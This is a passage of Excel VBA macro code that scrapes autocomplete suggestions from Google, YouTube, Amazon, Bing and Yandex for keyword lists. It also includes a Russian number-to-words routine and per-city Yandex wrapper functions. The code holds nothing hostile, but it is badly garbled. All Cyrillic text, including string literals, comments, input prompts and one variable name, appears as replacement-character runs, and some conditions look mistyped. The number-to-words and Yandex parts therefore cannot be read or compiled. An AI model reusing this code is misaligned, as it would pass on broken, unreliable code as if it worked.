OptimizeOFF
End Sub
Sub GoogleSuggestEn(Optional deep As Boolean = False)
    Dim XDoc As Object
    Dim gquery As String
    Dim phrase As String
    Dim dict As Object
    Dim arrsymbols()
    Dim i As Long
'|fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
Dim barCurrProg As Double
Dim barProgPerc As Double
Dim barWidth As Long
    arrsymbols = Array(" ", "a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "x", "y", "z", "1", "2", "3", "4", "5", "6", "7", "8", "9", "0")
If deep = True Then
    arrsymbols = Array(" ", "aa", "ab", "ac", "ad", "ae", "af", "ag", "ah", "ai", "aj", "ak", "al", "am", "an", "ao", "ap", "aq", "ar", "as", "at", "au", "av", "aw", "ax", "ay", "az", "ba", "bb", "bc", "bd", "be", "bf", "bg", "bh", "bi", "bj", "bk", "bl", _
 "bm", "bn", "bo", "bp", "bq", "br", "bs", "bt", "bu", "bv", "bw", "bx", "by", "bz", "ca", "cb", "cc", "cd", "ce", "cf", "cg", "ch", "ci", "cj", "ck", "cl", "cm", "cn", "co", "cp", "cq", "cr", "cs", "ct", "cu", "cv", "cw", "cx", _
 "cy", "cz", "da", "db", "dc", "dd", "de", "df", "dg", "dh", "di", "dj", "dk", "dl", "dm", "dn", "do", "dp", "dq", "dr", "ds", "dt", "du", "dv", "dw", "dx", "dy", "dz", "ea", "eb", "ec", "ed", "ee", "ef", "eg", "eh", "ei", "ej", _
 "ek", "el", "em", "en", "eo", "ep", "eq", "er", "es", "et", "eu", "ev", "ew", "ex", "ey", "ez", "fa", "fb", "fc", "fd", "fe", "ff", "fg", "fh", "fi", "fj", "fk", "fl", "fm", "fn", "fo", "fp", "fq", "fr", "fs", "ft", "fu", "fv", _
 "fw", "fx", "fy", "fz", "ga", "gb", "gc", "gd", "ge", "gf", "gg", "gh", "gi", "gj", "gk", "gl", "gm", "gn", "go", "gp", "gq", "gr", "gs", "gt", "gu", "gv", "gw", "gx", "gy", "gz", "ha", "hb", "hc", "hd", "he", "hf", "hg", "hh", _
 "hi", "hj", "hk", "hl", "hm", "hn", "ho", "hp", "hq", "hr", "hs", "ht", "hu", "hv", "hw", "hx", "hy", "hz", "ia", "ib", "ic", "id", "ie", "if", "ig", "ih", "ii", "ij", "ik", "il", "im", "in", "io", "ip", "iq", "ir", "is", "it", _
 "iu", "iv", "iw", "ix", "iy", "iz", "ja", "jb", "jc", "jd", "je", "jf", "jg", "jh", "ji", "jj", "jk", "jl", "jm", "jn", "jo", "jp", "jq", "jr", "js", "jt", "ju", "jv", "jw", "jx", "jy", "jz", "ka", "kb", "kc", "kd", "ke", "kf", _
 "kg", "kh", "ki", "kj", "kk", "kl", "km", "kn", "ko", "kp", "kq", "kr", "ks", "kt", "ku", "kv", "kw", "kx", "ky", "kz", "la", "lb", "lc", "ld", "le", "lf", "lg", "lh", "li", "lj", "lk", "ll", "lm", "ln", "lo", "lp", "lq", "lr", _
 "ls", "lt", "lu", "lv", "lw", "lx", "ly", "lz", "ma", "mb", "mc", "md", "me", "mf", "mg", "mh", "mi", "mj", "mk", "ml", "mm", "mn", "mo", "mp", "mq", "mr", "ms", "mt", "mu", "mv", "mw", "mx", "my", "mz", "na", "nb", "nc", "nd", _
 "ne", "nf", "ng", "nh", "ni", "nj", "nk", "nl", "nm", "nn", "no", "np", "nq", "nr", "ns", "nt", "nu", "nv", "nw", "nx", "ny", "nz", "oa", "ob", "oc", "od", "oe", "of", "og", "oh", "oi", "oj", "ok", "ol", "om", "on", "oo", "op", _
 "oq", "or", "os", "ot", "ou", "ov", "ow", "ox", "oy", "oz", "pa", "pb", "pc", "pd", "pe", "pf", "pg", "ph", "pi", "pj", "pk", "pl", "pm", "pn", "po", "pp", "pq", "pr", "ps", "pt", "pu", "pv", "pw", "px", "py", "pz", "qa", "qb", _
 "qc", "qd", "qe", "qf", "qg", "qh", "qi", "qj", "qk", "ql", "qm", "qn", "qo", "qp", "qq", "qr", "qs", "qt", "qu", "qv", "qw", "qx", "qy", "qz", "ra", "rb", "rc", "rd", "re", "rf", "rg", "rh", "ri", "rj", "rk", "rl", "rm", "rn", _
 "ro", "rp", "rq", "rr", "rs", "rt", "ru", "rv", "rw", "rx", "ry", "rz", "sa", "sb", "sc", "sd", "se", "sf", "sg", "sh", "si", "sj", "sk", "sl", "sm", "sn", "so", "sp", "sq", "sr", "ss", "st", "su", "sv", "sw", "sx", "sy", "sz", _
 "ta", "tb", "tc", "td", "te", "tf", "tg", "th", "ti", "tj", "tk", "tl", "tm", "tn", "to", "tp", "tq", "tr", "ts", "tt", "tu", "tv", "tw", "tx", "ty", "tz", "ua", "ub", "uc", "ud", "ue", "uf", "ug", "uh", "ui", "uj", "uk", "ul", _
 "um", "un", "uo", "up", "uq", "ur", "us", "ut", "uu", "uv", "uw", "ux", "uy", "uz", "va", "vb", "vc", "vd", "ve", "vf", "vg", "vh", "vi", "vj", "vk", "vl", "vm", "vn", "vo", "vp", "vq", "vr", "vs", "vt", "vu", "vv", "vw", "vx", _
 "vy", "vz", "wa", "wb", "wc", "wd", "we", "wf", "wg", "wh", "wi", "wj", "wk", "wl", "wm", "wn", "wo", "wp", "wq", "wr", "ws", "wt", "wu", "wv", "ww", "wx", "wy", "wz", "xa", "xb", "xc", "xd", "xe", "xf", "xg", "xh", "xi", "xj", _
 "xk", "xl", "xm", "xn", "xo", "xp", "xq", "xr", "xs", "xt", "xu", "xv", "xw", "xx", "xy", "xz", "ya", "yb", "yc", "yd", "ye", "yf", "yg", "yh", "yi", "yj", "yk", "yl", "ym", "yn", "yo", "yp", "yq", "yr", "ys", "yt", "yu", "yv", _
 "yw", "yx", "yy", "yz", "za", "zb", "zc", "zd", "ze", "zf", "zg", "zh", "zi", "zj", "zk", "zl", "zm", "zn", "zo", "zp", "zq", "zr", "zs", "zt", "zu", "zv", "zw", "zx", "zy", "zz", "1", "2", "3", "4", "5", "6", "7", "8", "9", "0")
 Else
 End If
    Set dict = CreateObject("Scripting.Dictionary")
    phrase = Application.InputBox("Input phrase", "Query", Type:=2)
OptimizeON
'|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|
Call InitProgressBar
    For i = 1 To UBound(arrsymbols)
    '1 |fffd||fffd||fffd||fffd||fffd||fffd|
        Set XDoc = CreateObject("MSXML2.DOMDocument")
        gquery = "http://suggestqueries.google.com/complete/search?output=toolbar&hl=ru&q=" & phrase & " " & arrsymbols(i)
        XDoc.async = False: XDoc.validateOnParse = False
        XDoc.Load (gquery)
        Set lists = XDoc.DocumentElement
         
    For Each listNode In lists.ChildNodes
            For Each fieldnode In listNode.ChildNodes
                If dict.exists(fieldnode.XML) Then
                Else: dict.Add fieldnode.XML, ""
                End If
            Next fieldnode
    Next listNode
        Set XDoc = Nothing
    Pause (0.1)
'|fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|
    barCurrProg = i / UBound(arrsymbols)
    barWidth = Progress.Border.Width * barCurrProg
    barProgPerc = Round(barCurrProg * 100, 0)
    Progress.Bar.Width = barWidth
    Progress.Text.Caption = barProgPerc & "% Complete"
Next i
'|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|
Unload Progress
    With Worksheets.Add
        .[a1].Resize(dict.Count) = Application.Transpose(dict.Keys)
    End With
    Columns("A:A").Replace What:="<suggestion data=""", Replacement:="", LookAt:= _
        xlPart, SearchOrder:=xlByRows, MatchCase:=True, SearchFormat:=False, _
        ReplaceFormat:=False
    Columns("A:A").Replace What:="""/>", Replacement:="", LookAt:=xlPart, _
        SearchOrder:=xlByRows, MatchCase:=True, SearchFormat:=False, _
        ReplaceFormat:=False
OptimizeOFF
End Sub
Sub GoogleSuggestDeepEn()
GoogleSuggestEn True
End Sub
Function getSugAmazon(x As String)
Dim url As String, i As Long
    url = "http://completion.amazon.com/search/complete?search-alias=aps&client=amazon-search-ui&mkt=1&q=" & ruToUTF8(CStr(x))
    Set httpReq = CreateObject("WinHttp.WinHttprequest.5.1")
    httpReq.Open "GET", url, False
    httpReq.SetRequestHeader "Content-Type", "text/xml"
    httpReq.setTimeouts 200, 200, 200, 200
    httpReq.Send request
    getSugAmazon = httpReq.responseText
    getSugAmazon = Left(getSugAmazon, InStr(1, getSugAmazon, "],[") - 1)
    i = Len(getSugAmazon)
    getSugAmazon = Mid$(getSugAmazon, Len(x) + 6, i - Len(x) - 5)
End Function
Function getSugBing(x As String) As String
Dim url As String
    url = "https://api.bing.com/osjson.aspx?query=" & ruToUTF8(CStr(x))
    Set httpReq = CreateObject("WinHttp.WinHttprequest.5.1")
    httpReq.Open "GET", url, False
    httpReq.SetRequestHeader "Content-Type", "text/xml"
    httpReq.setTimeouts 100, 100, 100, 100
    httpReq.Send request
    getSugBing = httpReq.responseText
    getSugBing = Mid$(getSugBing, Len(x) + 6, Len(getSugBing) - Len(x) - 7)
End Function
Sub arrSugAmazon()
UDFArr "getSugAmazon"
End Sub
Sub getSugAmazonToDict()
Dim x As String, dict As Object, a() As String, i As Long, j As Long, xi As String
Dim arrsymbols()
arrsymbols = Array("", "1", "2", "3", "4", "5", "6", "7", "8", "9", "0", "a", "b", "c", "d", "e", _
"f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "x", "y", "z")
x = Application.InputBox("Input search phrase", "", Type:=2)
Set dict = CreateObject("Scripting.Dictionary")
For i = LBound(arrsymbols) To UBound(arrsymbols)
    xi = x & " " & arrsymbols(i)
    a() = Split(getSugAmazon(xi), ",")
    For j = LBound(a) To UBound(a)
        If dict.exists(a(j)) Then Else dict.Add a(j), False
    Next j
Next i
dictToWS dict, 1, 1, 0
End Sub
Sub getSugYTToDict()
Dim x As String, dict As Object, a() As String, i As Long, j As Long, xi As String
Dim arrsymbols()
arrsymbols = Array(" ", "a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "x", "y", "z", _
    "1", "2", "3", "4", "5", "6", "7", "8", "9", "0")
x = Application.InputBox("Input search phrase", "", Type:=2)
Set dict = CreateObject("Scripting.Dictionary")
For i = LBound(arrsymbols) To UBound(arrsymbols)
    xi = x & " " & arrsymbols(i)
    a() = Split(getSugYoutube(xi), ",")
    For j = LBound(a) To UBound(a)
        If dict.exists(a(j)) Then Else dict.Add a(j), False
    Next j
Next i
dictToWS dict, 1, 1, 0
End Sub
Sub getSugBingToDict()
Dim x As String, dict As Object, a() As String, i As Long, j As Long, xi As String
Dim arrsymbols()
arrsymbols = Array(" ", "a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "x", "y", "z", _
    "1", "2", "3", "4", "5", "6", "7", "8", "9", "0")
x = Application.InputBox("Input search phrase", "", Type:=2)
Set dict = CreateObject("Scripting.Dictionary")
For i = LBound(arrsymbols) To UBound(arrsymbols)
    xi = x & " " & arrsymbols(i)
    a() = Split(getSugBing(xi), ",")
    For j = LBound(a) To UBound(a)
        If dict.exists(a(j)) Then Else dict.Add a(j), False
    Next j
Next i
dictToWS dict, 1, 1, 0
End Sub
Sub getSugAmazonToDictDeep()
Dim x As String, dict As Object, a() As String, i As Long, j As Long, xi As String
Dim arrsymbols()
arrsymbols = Array(" ", "aa", "ab", "ac", "ad", "ae", "af", "ag", "ah", "ai", "aj", "ak", "al", "am", "an", "ao", "ap", "aq", "ar", "as", "at", "au", "av", "aw", "ax", "ay", "az", "ba", "bb", "bc", "bd", "be", "bf", "bg", "bh", "bi", "bj", "bk", "bl", _
 "bm", "bn", "bo", "bp", "bq", "br", "bs", "bt", "bu", "bv", "bw", "bx", "by", "bz", "ca", "cb", "cc", "cd", "ce", "cf", "cg", "ch", "ci", "cj", "ck", "cl", "cm", "cn", "co", "cp", "cq", "cr", "cs", "ct", "cu", "cv", "cw", "cx", _
 "cy", "cz", "da", "db", "dc", "dd", "de", "df", "dg", "dh", "di", "dj", "dk", "dl", "dm", "dn", "do", "dp", "dq", "dr", "ds", "dt", "du", "dv", "dw", "dx", "dy", "dz", "ea", "eb", "ec", "ed", "ee", "ef", "eg", "eh", "ei", "ej", _
 "ek", "el", "em", "en", "eo", "ep", "eq", "er", "es", "et", "eu", "ev", "ew", "ex", "ey", "ez", "fa", "fb", "fc", "fd", "fe", "ff", "fg", "fh", "fi", "fj", "fk", "fl", "fm", "fn", "fo", "fp", "fq", "fr", "fs", "ft", "fu", "fv", _
 "fw", "fx", "fy", "fz", "ga", "gb", "gc", "gd", "ge", "gf", "gg", "gh", "gi", "gj", "gk", "gl", "gm", "gn", "go", "gp", "gq", "gr", "gs", "gt", "gu", "gv", "gw", "gx", "gy", "gz", "ha", "hb", "hc", "hd", "he", "hf", "hg", "hh", _
 "hi", "hj", "hk", "hl", "hm", "hn", "ho", "hp", "hq", "hr", "hs", "ht", "hu", "hv", "hw", "hx", "hy", "hz", "ia", "ib", "ic", "id", "ie", "if", "ig", "ih", "ii", "ij", "ik", "il", "im", "in", "io", "ip", "iq", "ir", "is", "it", _
 "iu", "iv", "iw", "ix", "iy", "iz", "ja", "jb", "jc", "jd", "je", "jf", "jg", "jh", "ji", "jj", "jk", "jl", "jm", "jn", "jo", "jp", "jq", "jr", "js", "jt", "ju", "jv", "jw", "jx", "jy", "jz", "ka", "kb", "kc", "kd", "ke", "kf", _
 "kg", "kh", "ki", "kj", "kk", "kl", "km", "kn", "ko", "kp", "kq", "kr", "ks", "kt", "ku", "kv", "kw", "kx", "ky", "kz", "la", "lb", "lc", "ld", "le", "lf", "lg", "lh", "li", "lj", "lk", "ll", "lm", "ln", "lo", "lp", "lq", "lr", _
 "ls", "lt", "lu", "lv", "lw", "lx", "ly", "lz", "ma", "mb", "mc", "md", "me", "mf", "mg", "mh", "mi", "mj", "mk", "ml", "mm", "mn", "mo", "mp", "mq", "mr", "ms", "mt", "mu", "mv", "mw", "mx", "my", "mz", "na", "nb", "nc", "nd", _
 "ne", "nf", "ng", "nh", "ni", "nj", "nk", "nl", "nm", "nn", "no", "np", "nq", "nr", "ns", "nt", "nu", "nv", "nw", "nx", "ny", "nz", "oa", "ob", "oc", "od", "oe", "of", "og", "oh", "oi", "oj", "ok", "ol", "om", "on", "oo", "op", _
 "oq", "or", "os", "ot", "ou", "ov", "ow", "ox", "oy", "oz", "pa", "pb", "pc", "pd", "pe", "pf", "pg", "ph", "pi", "pj", "pk", "pl", "pm", "pn", "po", "pp", "pq", "pr", "ps", "pt", "pu", "pv", "pw", "px", "py", "pz", "qa", "qb", _
 "qc", "qd", "qe", "qf", "qg", "qh", "qi", "qj", "qk", "ql", "qm", "qn", "qo", "qp", "qq", "qr", "qs", "qt", "qu", "qv", "qw", "qx", "qy", "qz", "ra", "rb", "rc", "rd", "re", "rf", "rg", "rh", "ri", "rj", "rk", "rl", "rm", "rn", _
 "ro", "rp", "rq", "rr", "rs", "rt", "ru", "rv", "rw", "rx", "ry", "rz", "sa", "sb", "sc", "sd", "se", "sf", "sg", "sh", "si", "sj", "sk", "sl", "sm", "sn", "so", "sp", "sq", "sr", "ss", "st", "su", "sv", "sw", "sx", "sy", "sz", _
 "ta", "tb", "tc", "td", "te", "tf", "tg", "th", "ti", "tj", "tk", "tl", "tm", "tn", "to", "tp", "tq", "tr", "ts", "tt", "tu", "tv", "tw", "tx", "ty", "tz", "ua", "ub", "uc", "ud", "ue", "uf", "ug", "uh", "ui", "uj", "uk", "ul", _
 "um", "un", "uo", "up", "uq", "ur", "us", "ut", "uu", "uv", "uw", "ux", "uy", "uz", "va", "vb", "vc", "vd", "ve", "vf", "vg", "vh", "vi", "vj", "vk", "vl", "vm", "vn", "vo", "vp", "vq", "vr", "vs", "vt", "vu", "vv", "vw", "vx", _
 "vy", "vz", "wa", "wb", "wc", "wd", "we", "wf", "wg", "wh", "wi", "wj", "wk", "wl", "wm", "wn", "wo", "wp", "wq", "wr", "ws", "wt", "wu", "wv", "ww", "wx", "wy", "wz", "xa", "xb", "xc", "xd", "xe", "xf", "xg", "xh", "xi", "xj", _
 "xk", "xl", "xm", "xn", "xo", "xp", "xq", "xr", "xs", "xt", "xu", "xv", "xw", "xx", "xy", "xz", "ya", "yb", "yc", "yd", "ye", "yf", "yg", "yh", "yi", "yj", "yk", "yl", "ym", "yn", "yo", "yp", "yq", "yr", "ys", "yt", "yu", "yv", _
 "yw", "yx", "yz", "za", "zb", "zd", "ze", "zf", "zg", "zh", "zi", "zj", "zk", "zl", "zm", "zn", "zo", "zp", "zq", "zr", "zs", "zu", "zv", "zw", "zx", "zy")
x = Application.InputBox("Input search phrase", "", Type:=2)
Set dict = CreateObject("Scripting.Dictionary")
For i = LBound(arrsymbols) To UBound(arrsymbols)
    xi = x & " " & arrsymbols(i)
    a() = Split(getSugAmazon(xi), ",")
    For j = LBound(a) To UBound(a)
        If dict.exists(a(j)) Then Else dict.Add a(j), False
    Next j
Next i
dictToWS dict, 2, 1, 0
End Sub
Function getSugYoutube(x As String) As String
Dim url As String, i As Long
url = "http://suggestqueries.google.com/complete/search?client=firefox&ds=yt&q=" & x
    Set httpReq = CreateObject("WinHttp.WinHttprequest.5.1")
    httpReq.Open "GET", url, False
    httpReq.SetRequestHeader "Content-Type", "text/xml"
    httpReq.setTimeouts 100, 100, 100, 100
    httpReq.Send request
    getSugYoutube = httpReq.responseText
    i = Len(getSugYoutube)
    getSugYoutube = Mid$(getSugYoutube, Len(x) + 6, i - Len(x) - 7)
End Function

'<><><><><><> RU ----- Yandex ----- <><><><><><><>'
Function sumToWords(x)
Dim l As Long
num = CStr(Fix(x))
mGen = True
sumToWords = numToWords(num, mGen)
sumToWords = UCase(Mid(sumToWords, 1, 1)) + _
                       Mid(sumToWords, 2)
l = Len(num)
If l = 1 Then
    num = "0" & num
    l = l + 1
End If
If Mid(num, l - 1, 1) = 1 Then
    sumToWords = sumToWords + "|fffd||fffd||fffd||fffd||fffd||fffd|"
Else
    Select Case Mid(num, l)
    Case 1
        sumToWords = sumToWords + "|fffd||fffd||fffd||fffd||fffd|"
    Case 2, 3, 4
        sumToWords = sumToWords + "|fffd||fffd||fffd||fffd||fffd|"
    Case Else
        sumToWords = sumToWords + "|fffd||fffd||fffd||fffd||fffd||fffd|"
    End Select
End If
i = (x - Fix(x)) * 100
If (i - Fix(i)) > 0.5 Then
    i = Fix(i) + 1
Else
    i = Fix(i)
End If
|fffd||fffd||fffd||fffd||fffd||fffd||fffd| = CStr(i)
If Len(|fffd||fffd||fffd||fffd||fffd||fffd||fffd|) = 1 Then
    |fffd||fffd||fffd||fffd||fffd||fffd||fffd| = "0" + |fffd||fffd||fffd||fffd||fffd||fffd||fffd|
End If
sumToWords = sumToWords + " " + |fffd||fffd||fffd||fffd||fffd||fffd||fffd| + " "
If Mid(|fffd||fffd||fffd||fffd||fffd||fffd||fffd|, 1, 1) = 1 Then
    sumToWords = sumToWords + "|fffd||fffd||fffd||fffd||fffd||fffd|"
Else
    Select Case Mid(|fffd||fffd||fffd||fffd||fffd||fffd||fffd|, 2)
    Case 1
        sumToWords = sumToWords + "|fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
    Case 2, 3, 4
        sumToWords = sumToWords + "|fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
    Case Else
        sumToWords = sumToWords + "|fffd||fffd||fffd||fffd||fffd||fffd|"
    End Select
End If
End Function
Function numToWords(x, Optional mGen = True)
E(1) = "|fffd||fffd||fffd|":       E(2) = "|fffd||fffd||fffd|"
E(3) = "|fffd||fffd||fffd|":       E(4) = "|fffd||fffd||fffd||fffd||fffd|"
E(5) = "|fffd||fffd||fffd|":       E(6) = "|fffd||fffd||fffd||fffd|"
E(7) = "|fffd||fffd||fffd|":       E(8) = "|fffd||fffd||fffd||fffd||fffd|"
E(9) = "|fffd||fffd||fffd||fffd||fffd|":     E(10) = "|fffd|"
E(11) = "|fffd|":        E(12) = "|fffd|"
E(13) = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd|":  E(14) = "|fffd||fffd||fffd||fffd||fffd|"
E(15) = "|fffd||fffd||fffd||fffd||fffd|":    E(16) = "|fffd||fffd||fffd||fffd||fffd||fffd|"
E(17) = "|fffd||fffd||fffd|":      E(18) = "|fffd||fffd||fffd|"
E(19) = "|fffd||fffd||fffd|":      E(20) = "|fffd||fffd||fffd|"
E(21) = "|fffd||fffd||fffd||fffd|":     E(22) = "|fffd||fffd||fffd||fffd||fffd|"
E(23) = "|fffd|":        E(24) = "|fffd|"
E(25) = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd|":  E(26) = "|fffd||fffd|"
E(27) = " ":        E(28) = "":
E(29) = "|fffd||fffd||fffd||fffd||fffd|":    E(30) = "|fffd||fffd||fffd|"
E(31) = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|": E(32) = "|fffd||fffd||fffd||fffd| "
ths = False:     ms = False
bs = False:   ndDec = False
x = Fix(x)
l = Len(x)
For pos = l To 1 Step -1
   numToWords = numToWords + _
                   d2w(Mid(x, _
                   l - pos + 1, 1), _
                   pos, mGen)
Next pos
If numToWords = "" Then
   numToWords = E(32)
End If
End Function
Private Function d2w(d, pos, gen) As String
If (d <> 0) And ((pos = 11) Or (pos = 12)) Then
   bs = True
End If
If (d <> 0) And ((pos = 8) Or (pos = 9)) Then
   ms = True
End If
If (d <> 0) And ((pos = 5) Or (pos = 6)) Then
   ths = True
End If
If ndDec Then
   Select Case d
   Case 0
     d2w = E(29) + E(12) + E(27)
   Case 2
     d2w = E(18) + E(13) + E(27)
   Case Else
     d2w = E(d) + E(13) + E(27)
   End Select
   Select Case pos
   Case 4
     d2w = d2w + E(22) + E(27)
   Case 7
     d2w = d2w + E(25) + E(26) + E(27)
   Case 10
     d2w = d2w + E(31) + E(26) + E(27)
   End Select
    ndDec = False:    ms = False
    bs = False:        ths = False
Else
   If (pos = 2) Or (pos = 5) Or _
        (pos = 8) Or (pos = 11) Then
     Select Case d
     Case 1
        ndDec = True
     Case 2, 3
        d2w = E(d) + E(14) + E(27)
     Case 4
        d2w = E(15) + E(27)
     Case 9
        d2w = E(16) + E(17) + E(27)
     Case 5, 6, 7, 8
        d2w = E(d) + E(12) + E(29) + E(27)
     End Select
   End If
   If (pos = 3) Or (pos = 6) Or _
        (pos = 9) Or (pos = 12) Then
     Select Case d
     Case 1
       d2w = E(17) + E(27)
     Case 2
       d2w = E(18) + E(19) + E(27)
     Case 3
       d2w = E(3) + E(30) + E(27)
     Case 4
       d2w = E(4) + E(11) + E(30) + E(27)
     Case 5, 6, 7, 8, 9
       d2w = E(d) + E(12) + E(20) + E(27)
     End Select
   End If
   If (pos = 1) Or (pos = 4) Or (pos = 7) Or (pos = 10) Then
     Select Case d
     Case 1
       If (gen) Then
          d2w = E(1) + E(10) + E(27)
       Else
          d2w = E(21) + E(27)
       End If
     Case 2
       If (gen) Then
          d2w = E(d) + E(27)
       Else
          d2w = E(18) + E(27)
       End If
     Case 3
       d2w = E(d) + E(27)
     Case 4
       d2w = E(4) + E(11) + E(27)
     Case 5, 6, 7, 8, 9
       d2w = E(d) + E(12) + E(27)
     End Select
     If pos = 4 Then
       Select Case d
       Case 0
         If th - s Then
           d2w = E(22) + E(27)
         End If
       Case 1
         d2w = E(21) + E(27) + E(22) + E(23) + E(27)
       Case 2
         d2w = E(18) + E(27) + E(22) + E(24) + E(27)
       Case 3, 4
         d2w = d2w + E(22) + E(24) + E(27)
       Case 5, 6, 7, 8, 9
         d2w = d2w + E(22) + E(27)
       End Select
       ths = False
     End If
     If pos = 7 Then
       Select Case d
       Case 0
         If m - s Then
           d2w = E(25) + E(26) + E(27)
         End If
       Case 1
         d2w = d2w + E(25) + E(27)
       Case 2, 3, 4
         d2w = d2w + E(25) + E(23) + E(27)
       Case 5, 6, 7, 8, 9
         d2w = d2w + E(25) + E(26) + E(27)
       End Select
       ms = False
     End If
     If pos = 10 Then
       Select Case d
       Case 0
         If bs Then
           d2w = E(31) + E(26) + E(27)
         End If
       Case 1
         d2w = d2w + E(31) + E(27)
       Case 2, 3, 4
         d2w = d2w + E(31) + E(23) + E(27)
       Case 5, 6, 7, 8, 9
         d2w = d2w + E(31) + E(26) + E(27)
       End Select
       bs = False
     End If
   End If
End If
End Function
Private Function getSugYa(x As String, id As Long)
Dim url As String
    url = "https://suggest.yandex.ru/suggest-ya.cgi?part=" & CStr(x) & "%20" & "&v=2&lr=" & CStr(id)
    Set httpReq = CreateObject("WinHttp.WinHttprequest.5.1")
    httpReq.Open "GET", url, False
    httpReq.SetRequestHeader "Content-Type", "text/xml"
    httpReq.setTimeouts 100, 100, 100, 100
    httpReq.Send request
    getSugYa = httpReq.responseText
    getSugYa = Mid$(getSugYa, Len(x) + 19, Len(getSugYa) - Len(x) - 20)
End Function
Private Sub arrSugYa()
Dim id As Long, i As Long
Dim arr()
id = Application.InputBox("|fffd||fffd||fffd||fffd||fffd||fffd||fffd| ID |fffd||fffd||fffd||fffd||fffd||fffd||fffd|", "", Type:=1)
OptimizeON
arr = Selection.Value2
For i = LBound(arr) To UBound(arr)
arr(i, 1) = getSugYa(CStr(arr(i, 1)), id)
Next i
Selection.Value2 = arr
OptimizeOFF
End Sub

Sub getSugYAtoArrID(Optional id As Long)
Dim url As String, arr() As String, x As String, getSugYa As String, i As Long, j As Long, dict As Object
Dim arrsymbols()
Set dict = CreateObject("Scripting.Dictionary")
OptimizeON
x = Application.InputBox("|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|", "", Type:=2)
arrsymbols = Array("", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", _
"|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", _
"1", "2", "3", "4", "5", "6", "7", "8", "9", "0", "a", "b", "c", "d", "e", _
"f", "g", "h", "i", "j", "k", _
"l", "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "x", "y", "z")
If Not id > 0 Then id = Application.InputBox("|fffd||fffd||fffd||fffd||fffd||fffd||fffd| Geo ID |fffd||fffd||fffd||fffd||fffd||fffd||fffd|", "", Type:=1)

For i = LBound(arrsymbols) To UBound(arrsymbols)
    url = "https://suggest.yandex.ru/suggest-ya.cgi?part=" & CStr(x) & "%20" & arrsymbols(i) & "&v=2&lr=" & CStr(id)
    Set httpReq = CreateObject("WinHttp.WinHttprequest.5.1")
    httpReq.Open "GET", url, False
    httpReq.SetRequestHeader "Content-Type", "text/xml"
    httpReq.setTimeouts 100, 100, 100, 100
    httpReq.Send request
    getSugYa = httpReq.responseText
    getSugYa = Mid$(getSugYa, Len(x) + 19, Len(getSugYa) - Len(x) - 20)
    arr = Split(getSugYa, ",")
    For j = LBound(arr) To UBound(arr)
    If dict.exists(arr(j)) Then
            Else:
            dict.Add arr(j), False
            End If
    Next j
    Erase arr
Next i
With dict
    Cells(1, 1).Resize(.Count) = Application.Transpose(.Keys)
End With
OptimizeOFF
remBlankRows
udalit_punktuatsiyu
End Sub
Function YSgVladimir(x As String) As String
YSgVladimir = getSugYa(x, 192)
End Function
Function YSgVoronezh(x As String) As String
YSgVoronezh = getSugYa(x, 193)
End Function
Function YSgIvanovo(x As String) As String
YSgIvanovo = getSugYa(x, 5)
End Function
Function YSgKaluga(x As String) As String
YSgKaluga = getSugYa(x, 6)
End Function
Function YSgKostroma(x As String) As String
YSgKostroma = getSugYa(x, 7)
End Function
Function YSgKursk(x As String) As String
YSgKursk = getSugYa(x, 8)
End Function
Function YSgLipetsk(x As String) As String
YSgLipetsk = getSugYa(x, 9)
End Function
Function YSgOrel(x As String) As String
YSgOrel = getSugYa(x, 10)
End Function
Function YSgRyazan(x As String) As String
YSgRyazan = getSugYa(x, 11)
End Function
Function YSgSmolensk(x As String) As String
YSgSmolensk = getSugYa(x, 12)
End Function
Function YSgTambov(x As String) As String
YSgTambov = getSugYa(x, 13)
End Function
Function YSgTver(x As String) As String
YSgTver = getSugYa(x, 14)
End Function
Function YSgTula(x As String) As String
YSgTula = getSugYa(x, 15)
End Function
Function YSgYAroslavl(x As String) As String
YSgYAroslavl = getSugYa(x, 16)
End Function
Function YSgArkhangelsk(x As String) As String
YSgArkhangelsk = getSugYa(x, 20)
End Function
Function YSgVologda(x As String) As String
YSgVologda = getSugYa(x, 21)
End Function
Function YSgKaliningrad(x As String) As String
YSgKaliningrad = getSugYa(x, 22)
End Function
Function YSgMurmansk(x As String) As String
YSgMurmansk = getSugYa(x, 23)
End Function
Function YSgVelikiyNovgorod(x As String) As String
YSgVelikiyNovgorod = getSugYa(x, 24)
End Function
Function YSgPskov(x As String) As String
YSgPskov = getSugYa(x, 25)
End Function
Function YSgPetrozavodsk(x As String) As String
YSgPetrozavodsk = getSugYa(x, 18)
End Function
Function YSgSyktyvkar(x As String) As String
YSgSyktyvkar = getSugYa(x, 19)
End Function
Function YSgAstrakhan(x As String) As String
YSgAstrakhan = getSugYa(x, 37)
End Function
Function YSgVolgograd(x As String) As String
YSgVolgograd = getSugYa(x, 38)
End Function
Function YSgKrasnodar(x As String) As String
YSgKrasnodar = getSugYa(x, 35)
End Function
Function YSgSochi(x As String) As String
